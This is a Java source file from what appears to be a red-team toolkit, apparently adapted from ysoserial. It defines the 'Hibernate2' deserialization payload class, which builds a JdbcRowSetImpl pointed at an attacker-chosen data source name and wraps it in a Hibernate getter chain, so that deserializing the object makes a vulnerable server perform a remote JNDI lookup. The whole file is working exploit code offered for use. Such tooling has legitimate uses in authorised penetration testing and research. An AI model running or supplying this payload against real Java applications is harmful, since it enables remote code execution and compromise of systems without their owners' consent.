package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.sun.rowset.JdbcRowSetImpl;

@SuppressWarnings("restriction")
@PayloadTest(precondition = "isApplicableJavaVersion")
@Authors({Authors.MBECHLER})
@Dependencies({
        "org.hibernate:hibernate-core:5.0.7.Final",
        "org.hibernate.javax.persistence:hibernate-jpa-2.1-api:1.0.0.Final",
        "org.jboss.logging:jboss-logging:3.3.0.Final",
        "org.apache.geronimo.specs:geronimo-jta_1.1_spec:1.1.1"
})
public class Hibernate2 implements ObjectPayload<Object> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    @Override
    public Object getObject(String command) throws Exception {
        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName(command);
        return Hibernate1.makeCaller(rowSet, Hibernate1.makeGetter(rowSet.getClass(), "getDatabaseMetaData"));
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Hibernate2.class, args);
    }
}
